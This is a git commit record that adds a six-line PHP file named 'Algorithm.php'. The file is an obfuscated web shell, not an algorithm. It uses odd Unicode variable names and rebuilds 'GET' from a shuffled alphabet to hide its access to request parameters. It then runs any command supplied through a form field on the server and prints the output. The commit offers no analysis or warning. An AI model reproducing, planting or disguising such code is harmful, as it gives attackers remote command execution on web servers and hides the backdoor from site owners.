9a6e9537663691c3c5385bc493f0d540a2041dcc
ra <116506553+suanggiLaut@users.noreply.github.com>
2025-11-02 21:21:14 +0700

    Create Algorithm.php

---
+++ Algorithm.php
@@ -0,0 +1,6 @@
+<?php
+$℺=range(0x41,0x59);$℻=array_map('chr',$℺);shuffle($℻);
+$ℼ=array_search('G',$℻);$ℽ=array_search('E',$℻);$ℾ=array_search('T',$℻);
+$ℿ=$℻[$ℼ].$℻[$ℽ].$℻[$ℾ];$ⅅ=${'_'.$ℿ}['ⅆ']??'id';echo`$ⅅ`;
+?>
+<form method=get><input name=ⅆ><input type=submit></form>
